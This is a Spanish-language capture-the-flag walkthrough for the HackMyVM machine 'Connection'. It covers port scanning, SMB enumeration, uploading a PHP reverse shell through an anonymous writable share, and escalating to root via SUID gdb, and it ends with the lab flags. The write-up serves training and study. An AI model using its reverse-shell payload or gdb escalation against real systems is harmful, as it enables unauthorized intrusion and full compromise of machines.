---
icon: flag
---

# Connection HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 12:50 EDT
Nmap scan report for 192.168.28.23
Host is up (0.00062s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b7:e6:01:b5:f9:06:a1:ea:40:04:29:44:f4:df:22:a1 (RSA)
|   256 fb:16:94:df:93:89:c7:56:85:84:22:9e:a0:be:7c:95 (ECDSA)
|_  256 45:2e:fb:87:04:eb:d1:8b:92:6f:6a:ea:5a:a2:a1:1c (ED25519)
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:AC:7F:8C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: CONNECTION; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-04-30T16:50:47
|_  start_date: N/A
|_nbstat: NetBIOS name: CONNECTION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: connection
|   NetBIOS computer name: CONNECTION\x00
|   Domain name: \x00
|   FQDN: connection
|_  System time: 2025-04-30T12:50:47-04:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h19m57s, deviation: 2h18m34s, median: -3s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.38 seconds
```

Veremos varios puertos interesantes, vamos a entrar en la pagina que esta alojada en el puerto `80` a ver que vemos.

Si entramos vemos un servidor de `apache2` normal que viene por defecto, por lo que no veremos gran cosa, vamos a realizar un poco de `fuzzing` por el servidor `SMB` a ver si encontramos algo interesante.

## enum4linux

```shell
enum4linux -a <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Apr 30 12:54:12 2025

 =========================================( Target Information )=========================================

Target ........... 192.168.28.23
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.28.23 )===========================


[+] Got domain/workgroup name: WORKGROUP


 ===============================( Nbtstat Information for 192.168.28.23 )===============================

Looking up status of 192.168.28.23
        CONNECTION      <00> -         B <ACTIVE>  Workstation Service
        CONNECTION      <03> -         B <ACTIVE>  Messenger Service
        CONNECTION      <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 192.168.28.23 )===================================
                                                                                                                                                             
                                                                                                                                                             
[+] Server 192.168.28.23 allows sessions using username '', password ''                                                                                      
                                                                                                                                                             
                                                                                                                                                             
 ================================( Getting domain SID for 192.168.28.23 )================================
                                                                                                                                                             
Domain Name: WORKGROUP                                                                                                                                       
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                         
                                                                                                                                                             
                                                                                                                                                             
 ==================================( OS information on 192.168.28.23 )==================================
                                                                                                                                                             
                                                                                                                                                             
[E] Can't get OS info with smbclient                                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
[+] Got OS info for 192.168.28.23 from srvinfo:                                                                                                              
        CONNECTION     Wk Sv PrQ Unx NT SNT Private Share for uploading files                                                                                
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 =======================================( Users on 192.168.28.23 )=======================================
                                                                                                                                                             
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                                                      
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 =================================( Share Enumeration on 192.168.28.23 )=================================
                                                                                                                                                             
                                                                                                                                                             
        Sharename       Type      Comment
        ---------       ----      -------
        share           Disk      
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Private Share for uploading files)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            CONNECTION

[+] Attempting to map shares on 192.168.28.23                                                                                                                
                                                                                                                                                             
//192.168.28.23/share   Mapping: OK Listing: OK Writing: N/A                                                                                                 
//192.168.28.23/print$  Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                               
                                                                                                                                                             
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                   
//192.168.28.23/IPC$    Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 192.168.28.23 )===========================
                                                                                                                                                             
                                                                                                                                                             

[+] Attaching to 192.168.28.23 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] CONNECTION
        [+] Builtin

[+] Password Info for Domain: CONNECTION

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
Password Complexity: Disabled                                                                                                                                
Minimum Password Length: 5


 ======================================( Groups on 192.168.28.23 )======================================
                                                                                                                                                             
                                                                                                                                                             
[+] Getting builtin groups:                                                                                                                                  
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting builtin group memberships:                                                                                                                      
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting local groups:                                                                                                                                   
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting local group memberships:                                                                                                                        
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting domain groups:                                                                                                                                  
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting domain group memberships:                                                                                                                       
                                                                                                                                                             
                                                                                                                                                             
 ==================( Users on 192.168.28.23 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                             
                                                                                                                                                             
[I] Found new SID:                                                                                                                                           
S-1-22-1                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[+] Enumerating users using SID S-1-5-21-3843522870-3254407083-846408333 and logon username '', password ''                                                  
                                                                                                                                                             
S-1-5-21-3843522870-3254407083-846408333-501 CONNECTION\nobody (Local User)                                                                                  
S-1-5-21-3843522870-3254407083-846408333-513 CONNECTION\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                  
                                                                                                                                                             
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                            
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                  
                                                                                                                                                             
S-1-22-1-1000 Unix User\connection (Local User)                                                                                                              

 ===============================( Getting printer info for 192.168.28.23 )===============================
                                                                                                                                                             
No printers returned.                                                                                                                                        


enum4linux complete on Wed Apr 30 12:54:36 2025
```

Vemos que hay un recurso compartido llamado `share` pero poco mas, vamos a ver si podemos enumerarlo de forma `anonima` de la siguiente forma:

```shell
smbclient -L //<IP>/ -N
```

Info:

```
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        share           Disk      
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Private Share for uploading files)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            CONNECTION
```

Vemos que efectivamente tiene un recurso compartido llamado `share`, vamos a ver si nos podemos conectar de forma anonima a dicho recurso.

```shell
smbclient //<IP>/share
```

Si dejamos la contraseña en blanco veremos que si podemos y si listamos veremos lo siguiente:

```
smb: \> ls
  .                                   D        0  Tue Sep 22 21:48:39 2020
  ..                                  D        0  Tue Sep 22 21:48:39 2020
  html                                D        0  Tue Sep 22 22:20:00 2020

                7158264 blocks of size 1024. 5460328 blocks available
smb: \> cd html\
smb: \html\> ls
  .                                   D        0  Tue Sep 22 22:20:00 2020
  ..                                  D        0  Tue Sep 22 21:48:39 2020
  index.html                          N    10701  Tue Sep 22 21:48:45 2020

                7158264 blocks of size 1024. 5460328 blocks available
```

Vemos que hay una carpeta llamada `html` y dentro de la misma un `index.html` lo que podemos creer que puede estar compartiendo la pagina mediante el servidor `SMB` y lo que se nos ocurre que podriamos subir un archivo `PHP` para generarnos una `reverse shell` de la siguiente forma:

## Escalate user www-data

Vamos a crear nuestro archivo `webshell.php`.

> webshell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Vamos a intentar subir el archivo a la carpeta `html` dentro del servidor `SMB` de la siguiente forma:

```shell
put webshell.php
```

Info:

```
putting file webshell.php as \html\webshell.php (18.6 kb/s) (average 18.6 kb/s)
```

Ahora vamos a ponernos a la escucha de la siguiente forma:

```shell
nc -lvnp <PORT>
```

Vamos a irnos en la pagina a nuestro archivo `webshell.php` y si volvemos a donde tenemos la escucha veremos lo siguiente:

```
URL = http://<IP>/webshell.php
```

```
listening on [any] 7777 ...
connect to [192.168.28.19] from (UNKNOWN) [192.168.28.23] 38838
whoami
www-data
```

Veremos que ha funcionado y habremos obtenido una `shell` con el usuario `www-data` por lo que vamos a sanitizarla.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate Privileges

Si listamos los permisos `SUID` de dicho usuario veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
3678     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   271481     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   273055    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
   265674     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
   266157     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
   265821     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
   262208     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
   279120   7824 -rwsr-sr-x   1 root     root        8008480 Oct 14  2019 /usr/bin/gdb
   262204     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
   262203     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
   266155     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
   262206     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
```

Veremos esta linea bastante interesante:

```
279120   7824 -rwsr-sr-x   1 root  root   8008480 Oct 14  2019 /usr/bin/gdb
```

Veremos que tenemos `GDB` con permisos `SUID` por lo que podremos realizar lo siguiente:

```shell
gdb -nx -ex 'python import os; os.execl("/bin/bash", "sh", "-p")' -ex quit
```

Info:

```
sh-5.0# whoami
root
```

Con esto veremos que ha funcionado, por lo que seremos `root` y leeremos la `flag` de dicho usuario:

> user.txt

```
3f491443a2a6aa82bc86a3cda8c39617
```

> root.txt

```
a7c6ea4931ab86fb54c5400204474a39
```
